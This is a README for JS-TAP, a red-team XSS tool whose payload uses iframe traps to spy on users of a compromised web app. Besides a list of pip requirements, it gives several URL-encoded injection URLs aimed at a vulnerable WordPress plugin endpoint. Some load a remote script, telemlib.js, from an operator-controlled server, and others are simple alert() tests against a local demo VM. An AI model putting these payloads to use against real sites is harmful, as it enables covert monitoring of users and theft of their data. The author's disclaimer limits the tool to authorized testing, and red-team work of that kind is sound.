# JS-TAP
Tailored XSS payload that uses iFrame traps to spy on user. Can also be used as a post exploitation payload. 
Intended for redteam ops. 
@hoodoer
hoodoer@bitwisemunitions.dev

This tool is intended to be used on systems you are authorized to attack.
Do not use this tool for illegal purposes, or I will be very angry in your general direction. 


Pip requirements: 

Server ones:
flask
flask-cors
flask-sqlalchemy
sqlalchemy-utils
flask-login
flask-bcrypt
python-magic
pyyaml
ua-parser
user-agents
pyopenssl
MarkupSafe


on mac I also needed: brew install libmagic


Generator ones:
dataframe_image
fpdf
progressbar




HTML Parser:
bs4




https://targetapp.possiblymalware.com/wp-content/plugins/sketchyPlugin/unauthXSS.php?param=%3Cscript%20src=%27https://192.168.2.61:8444/lib/telemlib.js%27%3E%3C/script%3E

https://targetapp.possiblymalware.com/wp-content/plugins/sketchyPlugin/unauthXSS.php?param=%3Cscript%20src=%27https://127.0.0.1:8444/lib/telemlib.js%27%3E%3C/script%3E



https://targetapp.possiblymalware.com/wp-content/plugins/sketchyPlugin/unauthXSS.php?param=%3Cscript%3Ealert(%27XSS%27)%3C/script%3E


-----
Local VM target server
http://targetapp.localdemo/wp-content/plugins/sketchyPlugin/unauthXSS.php

Alert:
http://targetapp.localdemo/wp-content/plugins/sketchyPlugin/unauthXSS.php?param=%3Cscript%3Ealert(%27XSS%27)%3C/script%3E


JS-Tap:
http://targetapp.localdemo/wp-content/plugins/sketchyPlugin/unauthXSS.php?param=%3Cscript%20src=%27https://127.0.0.1:8444/lib/telemlib.js%27%3E%3C/script%3E



